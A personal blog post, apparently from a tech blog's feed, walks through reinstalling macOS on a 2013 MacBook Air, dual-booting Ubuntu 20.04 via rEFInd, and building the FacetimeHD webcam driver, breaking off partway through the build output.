        <id>https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air</id>
        <link href="https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[Fill me up!]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>The other day when visiting my family, under a large pile of torn up binders and laminated documents, I found my sibling’s old 2013 MacBook Air. I thought it would be wasteful to just leave it there so I picked it up and took it to the lab, AKA home.
I discovered that the laptop was password locked with my sibling’s user and password. Since it must’ve been laying at my family’s house for a few years at least, and we as human’s have a tendency to forget our credentials, I decided to save the attempts and just format it and start with a clean OS.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="formatting-and-reinstalling-macos">Formatting and Reinstalling MacOS<a href="https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air#formatting-and-reinstalling-macos" class="hash-link" aria-label="Direct link to Formatting and Reinstalling MacOS" title="Direct link to Formatting and Reinstalling MacOS">​</a></h2>
<ol>
<li>In the&nbsp;<a href="https://support.apple.com/en-il/guide/mac-help/aside/mchl385f1eea/10.13/mac/10.13" target="_blank" rel="noopener noreferrer">menu bar</a>, choose Apple menu &gt; Restart. As your Mac restarts, hold down the <code>Command + R</code> keys until the macOS Utilities window appears.</li>
<li>Select <em>Disk Utility</em>, then click Continue.</li>
<li>Select your startup disk on the left, then click <em>Erase</em>.</li>
<li>Click the Format pop-up menu, choose <a href="https://support.apple.com/en-il/guide/mac-help/aside/dsku61bc26a5/10.13/mac/10.13" target="_blank" rel="noopener noreferrer">Mac OS Extended format</a>, enter a name, then click <em>Erase</em>.</li>
<li>After the disk is erased, choose <em>Disk Utility &gt; Quit Disk Utility</em>.</li>
<li>Select&nbsp;<a href="https://support.apple.com/en-il/guide/mac-help/reinstall-macos-mchlp1599/10.13/mac/10.13" target="_blank" rel="noopener noreferrer">Reinstall macOS</a>, click <em>Continue</em>, then follow the onscreen instructions.</li>
</ol>
<p>All of the steps ran smoothly and I had a working machine! The battery was still in really good shape as well, the screen was scratchless and the keyboard still had that bounce to it.
So I began downloading all the applications I usually use like Google Chrome, iTerm, Visual Studio Code. But when launching Google Chrome, I discovered that when navigating to GMail or Google Drive, I received an error message indicating that the applications do not support this browser and operating system.
I wasn’t buying it that the hardware would not be able to run the browser and applications and I had a strong belief that it’s some Apple-imposed limitation as part of the ‘<a href="https://en.wikipedia.org/wiki/Planned_obsolescence" target="_blank" rel="noopener noreferrer">Lightbulb Conspiracy</a>.’ So I decided to pursue a different option: installing the latest Ubuntu on this 2013 MacBook Air to free the software restrictions of the machine manufacturer and unleash the power of the hardware.
I decided the best approach would be to initially dual boot MacOS and Ubuntu, ensure that Ubuntu is stable and then remove the partition where MacOS lives.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="create-a-bootable-ubuntu-usb-stick">Create a Bootable Ubuntu USB Stick<a href="https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air#create-a-bootable-ubuntu-usb-stick" class="hash-link" aria-label="Direct link to Create a Bootable Ubuntu USB Stick" title="Direct link to Create a Bootable Ubuntu USB Stick">​</a></h2>
<p>The first step was to generate a bootable USB stick which would hold the Ubuntu image.
I logged into MacOS and downloaded the latest Ubuntu image from <a href="https://ubuntu.com/download/desktop" target="_blank" rel="noopener noreferrer">Ubuntu Desktop</a> and saved it in <code>~/Downloads/ubuntu-20.04.2.0-desktop-amd.iso</code>.</p>
<p>I then opened the Terminal and ran the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hdiutil convert </span><span class="token parameter variable" style="color:#36acaa">-format</span><span class="token plain"> UDRW </span><span class="token parameter variable" style="color:#36acaa">-o</span><span class="token plain"> /tmp/ubuntu.img ~/Downloads/ubuntu-20.04.2.0-desktop-amd.iso</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>The command utilizes the MacOS <code>hdutil</code> tool to convert an image between two data types: <code>.iso</code> (disk image in ISO-9660 standard) to <code>.img.dmg</code> (disk image specifically by MacOS). The <code>-format UDRW</code> argument specifies that we want to read and write the image with the Apple <code>UDIF</code> format. To read more about the hdutil and UDIF format, I suggest reading the <a href="https://ss64.com/osx/hdiutil.html" target="_blank" rel="noopener noreferrer">hdutil man page</a> and <a href="http://disktype.sourceforge.net/doc/ch03s13.html" target="_blank" rel="noopener noreferrer">disk image formats</a>.</p>
<p>The command above created a new file in <code>/tmp/ubuntu.img.dmg</code>. But since we don’t want to run the MacOS installer (which is what the dmg image and extension do by default) in this case but want to create a bootable USB stick, we’ll need to convert the image from <code>.img.dmg</code> to <code>.img</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">mv</span><span class="token plain"> /tmp/ubuntu.img.dmg /tmp/ubuntu.img</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>At this point we can insert the USB stick which will likely be mounted by default to <code>/dev/disk1</code>.
Next, we need to unmounting the disk representing the USB stick, copying all files from the image to the unmounted disk using the dd binary and then ejecting the disk. We can perform all these steps using the MacOS <code>diskutil</code> binary within the Terminal:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">diskutil unmountDisk /dev/disk1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dd</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">if</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/tmp/ubuntu.img </span><span class="token assign-left variable" style="color:#36acaa">of</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/dev/rdisk1 </span><span class="token assign-left variable" style="color:#36acaa">bs</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">1m</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">diskutil </span><span class="token function" style="color:#d73a49">eject</span><span class="token plain"> /dev/disk1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We’re done with this step! We now have a USB stick containing the Ubuntu OS. We can eject it for now.
Next, we need to prepare some disk space on the hard disk where we intend to install Ubuntu.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="creating-a-partition">Creating a Partition<a href="https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air#creating-a-partition" class="hash-link" aria-label="Direct link to Creating a Partition" title="Direct link to Creating a Partition">​</a></h2>
<p>A partition is basically a separation of the hard disk into individual sections (also known as containers).</p>
<p><img decoding="async" loading="lazy" src="https://www.maketecheasier.com/assets/uploads/2012/05/partitions-partition-diagram.png" alt="cont" class="img_ev3q"></p>
<p>To be able to run both Ubuntu and MacOS on the same machine, we require to create a partition in the hard disk to hold both operating systems.
This step is rather straightforward with the use of the MacOS Disk Utility. We need to launch it, select the first disk we see on the left navver (called <em>Macintosh HD</em> in the image below):</p>
<p>Then click on <em>Partition</em>, choose the size of the disk you want to allocate to the partition where we’ll store Ubuntu, make sure the selected format is <em>Mac OS Extended (Case-sensitive, Journaled)</em> and click Apply. My hard disk size was 120GB so I allocated 80GB to Ubuntu and left the rest for MacOS.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="replacing-macos-default-boot-manager">Replacing MacOS Default Boot Manager<a href="https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air#replacing-macos-default-boot-manager" class="hash-link" aria-label="Direct link to Replacing MacOS Default Boot Manager" title="Direct link to Replacing MacOS Default Boot Manager">​</a></h2>
<p>Let’s recap what we have done so far:</p>
<p>What would be the next logical step? We would need to tell the machine to let us decide which operating system we want to boot into. By default, the Apple bootloader will load MacOS. To change this behavior, we need to install a different boot manager. We need <a href="https://www.rodsbooks.com/refind/" target="_blank" rel="noopener noreferrer">rEFInd Boot Manager</a> to do this.</p>
<p><a href="http://sourceforge.net/projects/refind/files/0.13.2/refind-bin-0.13.2.zip/download" target="_blank" rel="noopener noreferrer">Download the binary</a> from here and extract it:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">unzip</span><span class="token plain"> ~/Downloads/refind-bin-0.13.2.zip</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Then reboot the machine and hold <code>Command + R</code>. This should bring you into Recovery Mode.</p>
<p>We need to run the <code>rEFInd</code> installation script. From the main menu bar, choose Utilities &gt; Terminal and type the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">cd</span><span class="token plain"> /Volumes/Macintosh</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"> HD/Users/YOUR_USERNAME/Downloads/refined</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&nbsp;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">./refind-install</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This will install the rEFInd boot manager. After it completes, shut down the machine, insert the USB stick we’ve prepared earlier and turn on the machine.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="launching-and-installing-ubuntu">Launching and Installing Ubuntu<a href="https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air#launching-and-installing-ubuntu" class="hash-link" aria-label="Direct link to Launching and Installing Ubuntu" title="Direct link to Launching and Installing Ubuntu">​</a></h2>
<p>When we turn on the machine the next time, we will be greeted with the rEFInd Boot Manager:</p>
<p><img decoding="async" loading="lazy" src="https://www.rodsbooks.com/refind/refind.png" alt="refind" class="img_ev3q"></p>
<p>Select Tux (the penguin, Linux mascot) and use the arrows to navigate to the <em>Try Ubuntu without install</em> option. Then press <em>e</em> which will expose a configuration file where we will make some changes. We will need to add the following commands between ‘splash‘ and ‘---‘:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">nomodeset </span><span class="token assign-left variable" style="color:#36acaa">radeon.audio</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This is because by default, the Radeon HDMI audio driver is disabled in the Linux kernel. After making this change, press F10 to save and exit.
After a minute or two, you should be the Ubuntu menu:</p>
<p><img decoding="async" loading="lazy" src="https://ubuntucommunity.s3-us-east-2.amazonaws.com/original/2X/a/ad5e454a9fd45fd56d90da951702c2f2224cd32a.png" alt="ubuntu" class="img_ev3q"></p>
<p>Click on <em>Install Ubuntu</em>, follow the installation wizard you should be set!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="addendum-fixing-camera-detection">Addendum: Fixing Camera Detection<a href="https://kbbgl.github.io/blog/installing-ubuntu-2004-on-2013-macbook-air#addendum-fixing-camera-detection" class="hash-link" aria-label="Direct link to Addendum: Fixing Camera Detection" title="Direct link to Addendum: Fixing Camera Detection">​</a></h2>
<p>One of the applications I use most nowadays is Zoom so I was surprised when I joined a call and saw that my camera was not detected by Zoom. I also downloaded <a href="https://wiki.gnome.org/Apps/Cheese" target="_blank" rel="noopener noreferrer">Cheese</a> just to confirm sure that the issue wasn’t specific to Zoom. I saw the same greeting: ‘no device detected’.
I did some research and found that there was some firmware missing for the Facetime HD (Broadcom 1570) PCIe webcam which prevented the kernel from detecting the driver. I opened up the terminal and ran the following commands to get the driver to work (you will need <code>git</code> and <code>curl</code> installed):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> /usr/local/src</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/patjak/bcwc_pcie.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Cloning into </span><span class="token string" style="color:#e3116c">'bcwc_pcie'</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote: Enumerating objects: </span><span class="token number" style="color:#36acaa">8</span><span class="token plain">, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote: Counting objects: </span><span class="token number" style="color:#36acaa">100</span><span class="token plain">% </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">8</span><span class="token plain">/8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote: Compressing objects: </span><span class="token number" style="color:#36acaa">100</span><span class="token plain">% </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">6</span><span class="token plain">/6</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote: Total </span><span class="token number" style="color:#36acaa">1057</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">delta </span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, reused </span><span class="token number" style="color:#36acaa">4</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">delta </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, pack-reused </span><span class="token number" style="color:#36acaa">1049</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Receiving objects: </span><span class="token number" style="color:#36acaa">100</span><span class="token plain">% </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1057</span><span class="token plain">/1057</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">352.48</span><span class="token plain"> KiB </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">537.00</span><span class="token plain"> KiB/s, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Resolving deltas: </span><span class="token number" style="color:#36acaa">100</span><span class="token plain">% </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">709</span><span class="token plain">/709</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> /usr/local/src/bcwc_pcie</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/patjak/facetimehd-firmware</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Cloning into </span><span class="token string" style="color:#e3116c">'facetimehd-firmware'</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote: Enumerating objects: </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote: Counting objects: </span><span class="token number" style="color:#36acaa">100</span><span class="token plain">% </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">1</span><span class="token plain">/1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">remote: Total </span><span class="token number" style="color:#36acaa">886</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">delta </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, reused </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">delta </span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, pack-reused </span><span class="token number" style="color:#36acaa">885</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Receiving objects: </span><span class="token number" style="color:#36acaa">100</span><span class="token plain">% </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">886</span><span class="token plain">/886</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, </span><span class="token number" style="color:#36acaa">290.76</span><span class="token plain"> KiB </span><span class="token operator" style="color:#393A34">|</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">294.00</span><span class="token plain"> KiB/s, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Resolving deltas: </span><span class="token number" style="color:#36acaa">100</span><span class="token plain">% </span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">585</span><span class="token plain">/585</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">, done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> /usr/local/src/bcwc_pcie/facetimehd-firmware</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">make</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Checking dependencies </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> driver download</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/curl</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/xzcat</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/bin/cpio</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Downloading the driver, please wait</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Found matching </span><span class="token builtin class-name">hash</span><span class="token plain"> from OS X, El Capitan </span><span class="token number" style="color:#36acaa">10.11</span><span class="token plain">.5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">==</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> Extracting firmware</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> --</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> Decompressing the firmware using gzip</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> --</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> Deleting temporary files</span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> --</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> Extracted firmware version </span><span class="token number" style="color:#36acaa">1.43</span><span class="token plain">.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">make</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Copying firmware into </span><span class="token string" style="color:#e3116c">'//lib/firmware/facetimehd'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token builtin class-name">cd</span><span class="token plain"> /usr/local/src/bcwc_pcie</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">make</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">make</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-C</span><span class="token plain"> /lib/modules/5.0.0-23-generic/build </span><span class="token assign-left variable" style="color:#36acaa">M</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/usr/local/src/bcwc_pcie modules</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">make</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">: Entering directory </span><span class="token string" style="color:#e3116c">'/usr/src/linux-headers-5.0.0-23-generic'</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/fthd_ddr.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/fthd_hw.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/fthd_drv.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/fthd_ringbuf.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/fthd_isp.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/fthd_v4l2.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/fthd_buffer.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  CC </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">  /usr/local/src/bcwc_pcie/fthd_debugfs.o</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  LD </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">M</span><span class="token punctuation" 